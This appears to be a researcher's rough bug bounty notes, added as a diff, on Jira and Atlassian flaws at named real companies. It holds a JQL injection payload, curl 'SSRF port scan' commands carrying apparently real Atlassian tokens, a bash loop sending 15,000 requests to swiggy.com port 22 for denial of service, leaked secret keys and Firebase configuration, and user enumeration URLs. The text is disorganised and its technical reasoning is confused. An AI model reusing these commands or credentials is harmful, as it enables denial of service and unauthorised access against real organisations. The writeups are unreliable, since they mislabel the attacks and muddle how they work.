@@ -1,0 +1,270 @@
+Surpsirse Bugs
+
+
+1. Jira -
+
+
+target = logo - target fixed 
+
+
+bmw
+
+Check
+
+1. Logo
+2. Endpoints will be same for all
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1. Hi team,
+
+
+I found JQL injection in https://wiki.eveoh.nl
+
+
+Description
+The JQL query in our case limits the data to one project and a specific (and rather short) time range (the current month). This restriction is hard-coded and should not change. However, a crafted user value allows us to remove this limitation:
+Martin Schneider' OR created < '2021-01-01
+Now the query becomes
+project = TeamA AND created > startOfMonth() AND assignee = 'Martin Schneider' OR created < '2021-01-01'
+will fetch all tickets from all projects of the entire JIRA instance!
+
+How to reproduce
+Go to https://wiki.eveoh.nl/issues/?jql=
+in jql paramter put any heavy load crafted payload
+And perform attack  multiple times
+attack vector is to craft JQL queries with bad performance and thus long runtime. I didn’t explore this in detail, but it’s easy to imagine that queries using JQL functions, especially custom ones, can be designed to become quite expensive. JIRA has some safeguards in place, but this might still open an attack vector to perform DoS attacks by sending multiple such queries at the same time.
+
+
+blackberry.atlassian.net/issues/?jql=
+
+image.png
+image.png
+Solution
+As a security threat, JQL injection is far from being on the same level as SQL injection. However, there are ways an attacker can exploit it. It is important to understand under which circumstances it poses a threat and how to prevent it.
+With security, having multiple layers of protection is a fundamental principle. In my opinion, input sanitisation should always be one of them.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2. Summary: Atlassian token disclosure and crafting nested queries with internal port scan as SSRF may leads to application level DOS
+
+Steps to reproduce:
+  1.  Use this in cmd:  curl -v https://enroll.onduo.com --user admin@onduo.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout
+
+  2. I got this token from burpsuite spidering of onduo.atlassian.net
+
+  3. Now run this curl -v https://onduo.com:22 --user admin@onduo.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout
+
+We can see the time delay on port change 80,8080 giving instant response but 22 port giving late reponse
+
+Browser/OS:  NA/ Firefox
+
+Attack scenario:
+A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
+
+An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application, leading to potential legal liabilities and reputational damage.
+
+When we check command on 80,8080 port it gives speedy response but on port 22 it gives late response . It means 22 closed. If hacker perform this attack like port scan then this may leads to DOS
+
+
+POC: https://drive.google.com/file/d/1jXxCH80e9EwGjHWMGC716iB1Z6l4_xsw/view?usp=sharing
+curl -v https://solarcity.co.nz:8080 --user admin@solarcity.atlassian.net:1b3d4ce9765e297549f299c2bcddd63b4b74fec3_lout
+
+
+curl -v https://solarcity.co.nz:22 --user admin@solarcity.atlassian.net:1b3d4ce9765e297549f299c2bcddd63b4b74fec3_lout
+
+
+curl -v https://solarcity.co.nz:5000 --user admin@solarcity.atlassian.net:1b3d4ce9765e297549f299c2bcddd63b4b74fec3_lout
+
+curl -v https://solarcity.co.nz:80 --user admin@solarcity.atlassian.net:1b3d4ce9765e297549f299c2bcddd63b4b74fec3_lout
+
+
+
+
+
+
+
+Syntax: curl -v https://solarcity.co.nz --user admin@solarcity.atlassian.net:1b3d4ce9765e297549f299c2bcddd63b4b74fec3_lout
+
+
+logitech.atlassian.net/projects
+
+
+
+Generic Secret: secretAccessKey:"Ni2gv72ObKp6cifm0g1zJgusvC0kJRc7PccRRp7q" found in https://www.solarcity.co.nz/d17edae318344da0ec9016a78cd197a6b10b8f22-812494965908498fa644.js
+
+
+
+Hello team,
+
+As I mentioned in 2nd step that I got token while crawling whole web app or else simple method is that we can check source code on following endpoint-- https://onduollc.atlassian.net/projects
+
+Steps to reproduce issue:
+1. Check source code of  https://onduollc.atlassian.net/projects
+2. Search for "atlassian-token"
+3. Atlassian token can be used for crafting nested queries but I escalated this to SSRF port scan
+4. Syntax for crafting next queries :  curl -v  https://mainhost.com --user anyuser@target.atlassian.net:atlassian_token_here_lout
+
+Exploit command:
+1. On port 80
+curl -v https://onduo.com:80 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+
+It crafted queries and gives us valid response , We can say instant response 
+image.png
+
+2. On port 22
+curl -v https://onduo.com:22 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+It gave me response after 1 min 45 seconds :" failed to connect on port 22"
+image.png
+
+3. On port 443 
+curl -v https://onduo.com:443 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout  
+It gave me response which was instant with crafted queries
+
+PORT443.gif
+
+An interesting part is when I change the host on port which we check
+
+Command is curl -v https://enroll.onduo.com:443 --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_527e5684de2592899d0da0846645f0121f031459_lout   
+
+it gave me following information :
+
+__FIREBASE_API_KEY__ = 'AIzaSyCq7ZPizDqVfo0D8y8fTfHIDqJ5Qq7FvFc'; __FIREBASE_PROJECT_ID__ = 'diabetes-management'; __FIREBASE_AUTH_DOMAIN__ = 'diabetes-management.firebaseapp.com'; __FIREBASE_DATABASE_URL__ = 'https:\/\/diabetes-management.firebaseio.com'; __FIREBASE_STORAGE_BUCKET__ = 'diabetes-management.appspot.com'; __FIREBASE_MESSAGING_SENDER_ID__ = '719737211384'
+
+Also I tried same command with port 3306 it takes a long time
+
+
+
+Impact: The first part is , It gives instant response on open port and when I try with closed port like 3306,22 it takes long to craft queries
+
+So If hacker try same attacks on closed ports so the command will force a server to craft queries because of a closed port it's not going to craft it . Performing same attack on closed ports to craft queries will make server engage and this may leads to DOS attack. 
+
+Changing host enroll.onduo.com with port 443 to perform SSRF was giving sensitive information about firebase stuff 
+
+If you've any queries feel free to ask 
+
+
+
+
+
+https://gopro.atlassian.net/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
+
+As we mentioned earlier, the HackerOne for Jira application, after installing it, creates an integration between the HackerOne platform and the atlassian where cases can be synchronized from HackerOne to atlassian
+And vice versa. So, after installation, administrators  jira account is allowed to go https://YOUDOMIN.atlassian.net/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira When going to this page, the following message will appear:
+Image F1196098: H1PlugConf.png 37.89 KiB
+Zoom in Zoom out Copy Download
+When you click on "click here", you will be directed to a link  this "https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>" containing JWT parameter to complete the integration process. So. Based on the About jira description, an employee with "BSSIC" privileges is not allowed to access the application configuration.  After testing if the HackerOne for Jira app. checks the permissions of Jira users before providing the user with the JWT, it is found that the  [HackerOne for Jira] application does not verify the user's permissions and generates the JWT code for a user with basic privileges. This allows this malicious user to link their hackerone account to an instance of a jira that they do not own. Which leads, for example, to leak names of private projects or create issues in private projects .. etc
+
+
+
+
+
+
+
+
+
+
+
+1. check https://your-site.atlassian.net/projects
+2. Check source : Get token : _lout - 475a1390d643bc1f61b3cd402ec4b01869eab806_lout
+
+
+
+curl -v https://swiggy.com:22 --user admin@swiggy.atlassian.net:475a1390d643bc1f61b3cd402ec4b01869eab806_lout
+
+
+
+for ((i=1; i<=15000; i++)); do     curl -v https://swiggy.com:22 --user admin@swiggy.atlassian.net:475a1390d643bc1f61b3cd402ec4b01869eab806_lout; done
+
+report
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+3/4. Unauth access Desk
+
+
+Logo
+
+https://zoho.atlassian.net/servicedesk/customer/user/signup
+
+
+
+Hi team,
+
+
+Aditya here found unauthorised access on demo server 
+
+URL: https://jira.typo3.com/servicedesk/customer/user/signup
+
+ Customers who have downloaded and installed affected versions of Jira Service Desk Server and Data, please upgrade your Jira Service Desk Server and Data Center installations immediately to fix this vulnerability. By design, Jira Service Desk gives customer portal users permissions only to raise requests and view issues. This allows users to interact with the customer portal without having direct access to Jira. These restrictions can be bypassed by a remote attacker with portal access who exploits a path traversal vulnerability. Exploitation allows an attacker to view all issues within all Jira projects contained in the vulnerable instance. This could include Jira Service Desk projects, Jira Core projects, and Jira Software projects. Impact Attacker can raise unlimited issues. 
+
+
+ 5. Summary: REST API endpoint disclosing sensitive unauthenticated information about admin with iD
+
+Steps to reproduce:
+  1. Open following URLs :
+ https://onduollc.atlassian.net/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true |  
+ https://onduollc.atlassian.net/rest/api/2/user/picker?query=admin |
+ https://onduollc.atlassian.net/ViewUserHover.jspa?username=Admin(user enumrated404) |
+ https://onduollc.atlassian.net/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+ 
+
+Browser/OS:  Chrome/ Windows 10
+
+Attack scenario:
+This following domain is vulnerable for CVE-2019-3403 which makes it more buggy for information disclosure . The /rest/api/2/user/picker rest resource in Jira before version 7.13.3, from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to enumerate usernames via an incorrect authorisation check. The CVSS score is 5.3.
+
+
+Solution : Update the jira version for onduo subs
+
+
+Reference: https://hackerone.com/reports/632808
